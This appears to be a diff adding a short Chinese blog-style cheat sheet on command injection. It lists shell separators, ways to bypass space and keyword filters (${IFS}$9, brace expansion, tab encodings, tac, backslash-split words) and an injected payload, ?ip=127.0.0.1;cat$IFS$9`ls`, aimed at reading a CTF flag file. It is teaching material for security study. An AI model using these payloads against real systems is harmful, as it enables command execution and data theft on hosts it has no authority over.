@@ -1,0 +1,19 @@
+<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><h1 id="什么是命令注入"><a href="#什么是命令注入" class="headerlink" title="什么是命令注入"></a>什么是<a href="https://www.cnblogs.com/Hekeats-L/p/16930730.html">命令注入</a></h1><p>‍</p>
+<h3 id="命令联合执行"><a href="#命令联合执行" class="headerlink" title="命令联合执行"></a>命令联合执行</h3><blockquote>
+<p>;     前面的执行完执行后面的<br>|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）<br>||    当前面的执行出错时（为假）执行后面的<br>&amp;     将任务置于后台执行<br>&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真<br>%0a  （换行）<br>%0d  （回车）</p>
+</blockquote>
+<p>‍</p>
+<h3 id="命令绕过空格方法有："><a href="#命令绕过空格方法有：" class="headerlink" title="命令绕过空格方法有："></a>命令绕过空格方法有：</h3><blockquote>
+<p>${IFS}$9<br>{IFS}<br>$IFS<br>${IFS}<br>$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行<br>IFS<br>&lt;<br>&lt;&gt;<br>{cat,flag.php}  &#x2F;&#x2F;用逗号实现了空格功能，需要用{}括起来<br>%20   (space)<br>%09   (tab)<br>X&#x3D;$’cat\x09.&#x2F;flag.php’;$X       （\x09表示tab，也可以用\x20）</p>
+</blockquote>
+<blockquote>
+<p>ps:有时会禁用cat:<br>解决方法是使用tac反向输出命令：<br>linux命令中可以加\，所以甚至可以ca\t &#x2F;fl\ag</p>
+</blockquote>
+<p>‍</p>
+<p>‍</p>
+<h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><blockquote>
+<p>?ip&#x3D;127.0.0.1;cat$IFS$9<code>ls</code>​</p>
+<p>$IFS在Linux下表示为空格<br>$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</p>
+<p>这里$IFS$9或$IFS垂直，后面加个$与{}类似，起截断作用</p>
+</blockquote>
+<p>‍</p>
